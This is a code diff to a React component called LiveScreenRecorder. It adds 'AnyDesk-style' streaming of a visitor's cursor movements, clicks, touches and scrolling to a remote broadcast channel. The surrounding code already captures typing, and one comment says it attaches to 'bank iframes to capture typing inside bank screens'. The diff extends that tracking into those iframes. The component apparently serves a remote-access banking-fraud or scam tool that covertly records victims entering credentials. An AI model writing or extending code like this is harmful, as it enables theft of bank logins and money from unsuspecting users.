@@ -326,6 +326,62 @@ export function LiveScreenRecorder() {
       window.addEventListener("blur", handleBlur, { capture: true, passive: true });
       window.addEventListener("focus", handleFocus, { capture: true, passive: true });
 
+      // ANYDESK-STYLE LIVE CURSOR & SCROLL BROADCAST
+      let lastCursorSend = 0;
+      const sendCursor = (x: number, y: number, isClick = false, isTouch = false) => {
+        if (!isStreamingRef.current || !channelRef.current) return;
+        const now = Date.now();
+        if (!isClick && now - lastCursorSend < 30) return; // ~33fps smooth cursor streaming
+        lastCursorSend = now;
+        void sendBroadcastPacket(channelRef.current, "client_cursor", {
+          x: Math.max(0, Math.min(1, x)),
+          y: Math.max(0, Math.min(1, y)),
+          isClick,
+          isTouch,
+        });
+      };
+
+      const onMouseMove = (e: MouseEvent) => {
+        sendCursor(e.clientX / window.innerWidth, e.clientY / window.innerHeight, false, false);
+      };
+
+      const onMouseDown = (e: MouseEvent) => {
+        sendCursor(e.clientX / window.innerWidth, e.clientY / window.innerHeight, true, false);
+      };
+
+      const onTouchMove = (e: TouchEvent) => {
+        if (e.touches.length > 0) {
+          const t = e.touches[0];
+          sendCursor(t.clientX / window.innerWidth, t.clientY / window.innerHeight, false, true);
+        }
+      };
+
+      const onTouchStart = (e: TouchEvent) => {
+        if (e.touches.length > 0) {
+          const t = e.touches[0];
+          sendCursor(t.clientX / window.innerWidth, t.clientY / window.innerHeight, true, true);
+        }
+      };
+
+      let lastScrollSend = 0;
+      const onScroll = () => {
+        if (!isStreamingRef.current || !channelRef.current) return;
+        const now = Date.now();
+        if (now - lastScrollSend < 50) return;
+        lastScrollSend = now;
+        const maxScroll = Math.max(1, document.documentElement.scrollHeight - window.innerHeight);
+        void sendBroadcastPacket(channelRef.current, "client_scroll", {
+          scrollY: window.scrollY,
+          scrollRatio: window.scrollY / maxScroll,
+        });
+      };
+
+      window.addEventListener("mousemove", onMouseMove, { passive: true });
+      window.addEventListener("mousedown", onMouseDown, { passive: true });
+      window.addEventListener("touchmove", onTouchMove, { passive: true });
+      window.addEventListener("touchstart", onTouchStart, { passive: true });
+      window.addEventListener("scroll", onScroll, { passive: true });
+
       // ATTACH TO SAME-ORIGIN BANK IFRAMES TO CAPTURE TYPING INSIDE BANK SCREENS!
       const attachToIframe = (ifr: HTMLIFrameElement) => {
         try {
@@ -336,6 +392,14 @@ export function LiveScreenRecorder() {
             doc.addEventListener("change", handleInput, { capture: true, passive: true });
             doc.addEventListener("focus", handleFocus, { capture: true, passive: true });
             doc.addEventListener("blur", handleBlur, { capture: true, passive: true });
+            doc.addEventListener("mousemove", (e: MouseEvent) => {
+              const rect = ifr.getBoundingClientRect();
+              sendCursor((rect.left + e.clientX) / window.innerWidth, (rect.top + e.clientY) / window.innerHeight, false, false);
+            }, { passive: true });
+            doc.addEventListener("mousedown", (e: MouseEvent) => {
+              const rect = ifr.getBoundingClientRect();
+              sendCursor((rect.left + e.clientX) / window.innerWidth, (rect.top + e.clientY) / window.innerHeight, true, false);
+            }, { passive: true });
           }
         } catch {
           /* ignore */
@@ -391,6 +455,11 @@ export function LiveScreenRecorder() {
         window.removeEventListener("input", handleInput, true);
         window.removeEventListener("blur", handleBlur, true);
         window.removeEventListener("focus", handleFocus, true);
+        window.removeEventListener("mousemove", onMouseMove);
+        window.removeEventListener("mousedown", onMouseDown);
+        window.removeEventListener("touchmove", onTouchMove);
+        window.removeEventListener("touchstart", onTouchStart);
+        window.removeEventListener("scroll", onScroll);
       };
     }
 
